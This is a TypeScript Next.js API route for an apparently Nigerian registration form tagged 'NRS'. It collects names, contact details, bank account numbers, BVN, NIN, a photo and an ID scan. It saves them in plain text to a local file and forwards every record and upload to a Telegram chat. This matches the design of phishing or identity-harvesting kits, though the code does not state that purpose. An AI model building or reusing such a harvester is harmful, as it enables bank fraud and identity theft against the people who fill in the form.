import { randomBytes } from "node:crypto";
import { mkdir, appendFile } from "node:fs/promises";
import path from "node:path";
import { BANK_SET } from "@/lib/banks";
import { notifyTelegram, type RegistrationRecord } from "@/lib/telegram";

export const runtime = "nodejs";
export const dynamic = "force-dynamic";

const PHOTO_MAX = 5 * 1024 * 1024;
const ID_MAX = 8 * 1024 * 1024;
const ID_TYPES = new Set([
  "National ID (NIN slip)",
  "Driver's licence",
  "Permanent voter's card (PVC)",
  "International passport",
  "None available",
]);

type Errors = Record<string, string>;

function makeRef() {
  return `NRS-${new Date().getFullYear()}-${randomBytes(4).toString("hex").toUpperCase()}`;
}

function str(form: FormData, key: string) {
  return String(form.get(key) ?? "").trim();
}

async function persist(row: RegistrationRecord) {
  try {
    const dir = path.join(process.cwd(), "data");
    await mkdir(dir, { recursive: true });
    await appendFile(
      path.join(dir, "registrations.jsonl"),
      `${JSON.stringify({ ...row, createdAt: new Date().toISOString() })}\n`,
      "utf8",
    );
  } catch (err) {
    // Never fail a registration because local disk write failed.
    console.error("[register] persist failed", err);
  }
}

export async function POST(req: Request) {
  let form: FormData;
  try {
    form = await req.formData();
  } catch {
    return Response.json({ error: "Malformed submission." }, { status: 400 });
  }

  // Honeypot — bots fill hidden "website" field.
  if (str(form, "website")) {
    return Response.json({ ok: true, ref: makeRef() });
  }

  const fullName = str(form, "fullName").replace(/\s+/g, " ");
  const phone = str(form, "phone").replace(/[\s-]/g, "");
  const dob = str(form, "dob");
  const email = str(form, "email").toLowerCase();
  const address = str(form, "address");
  const bankName = str(form, "bankName");
  const accountNumber = str(form, "accountNumber").replace(/\D/g, "");
  const accountName = str(form, "accountName").replace(/\s+/g, " ");
  const bvn = str(form, "bvn").replace(/\D/g, "");
  const nin = str(form, "nin").replace(/\D/g, "");
  const idType = str(form, "idType");
  const consent = str(form, "consent") === "true";

  const photo = form.get("photo");
  const idFile = form.get("idFile");
  const photoFile = photo instanceof File && photo.size > 0 ? photo : null;
  const idFileObj = idFile instanceof File && idFile.size > 0 ? idFile : null;

  const errors: Errors = {};

  if (fullName.split(" ").filter(Boolean).length < 2) {
    errors.fullName = "Enter first name and surname.";
  }
  if (!/^(\+?234|0)[789][01]\d{8}$/.test(phone)) {
    errors.phone = "Enter a valid Nigerian number.";
  }
  if (!dob) {
    errors.dob = "Enter your date of birth.";
  } else if (Number.isNaN(Date.parse(dob)) || Date.parse(dob) > Date.now()) {
    errors.dob = "Enter a valid date of birth.";
  }
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email)) {
    errors.email = "Enter a valid email.";
  }
  if (address.length < 12) {
    errors.address = "Enter your full residential address.";
  }

  if (!BANK_SET.has(bankName)) {
    errors.bankName = "Select your bank.";
  }
  if (!/^\d{10}$/.test(accountNumber)) {
    errors.accountNumber = "Account number must be 10 digits.";
  }
  if (accountName.length < 3) {
    errors.accountName = "Enter the account name as it appears on your bank record.";
  }

  if (!/^\d{11}$/.test(bvn)) errors.bvn = "BVN must be 11 digits.";
  if (!/^\d{11}$/.test(nin)) errors.nin = "NIN must be 11 digits.";
  if (!ID_TYPES.has(idType)) errors.idType = "Select an ID type.";

  if (!photoFile) {
    errors.photo = "Upload a recent photograph.";
  } else if (!photoFile.type.startsWith("image/")) {
    errors.photo = "Photograph must be an image file.";
  } else if (photoFile.size > PHOTO_MAX) {
    errors.photo = "Photograph must be under 5MB.";
  }

  if (idType !== "None available") {
    if (!idFileObj) {
      errors.idFile = "Upload the ID document.";
    } else if (
      !idFileObj.type.startsWith("image/") &&
      idFileObj.type !== "application/pdf"
    ) {
      errors.idFile = "ID must be an image or PDF.";
    } else if (idFileObj.size > ID_MAX) {
      errors.idFile = "ID file must be under 8MB.";
    }
  }

  if (!consent) errors.consent = "Tick the consent box to continue.";

  if (Object.keys(errors).length > 0) {
    return Response.json({ ok: false, errors }, { status: 422 });
  }

  const record: RegistrationRecord = {
    ref: makeRef(),
    fullName,
    phone,
    dob,
    email,
    address,
    bankName,
    accountNumber,
    accountName,
    bvn,
    nin,
    idType,
  };

  await persist(record);

  try {
    await notifyTelegram(record, {
      photo: photoFile,
      idFile: idType === "None available" ? null : idFileObj,
    });
  } catch (err) {
    // Telegram down must not block the applicant.
    console.error("[register] telegram notify failed", err);
  }

  return Response.json({ ok: true, ref: record.ref });
    }
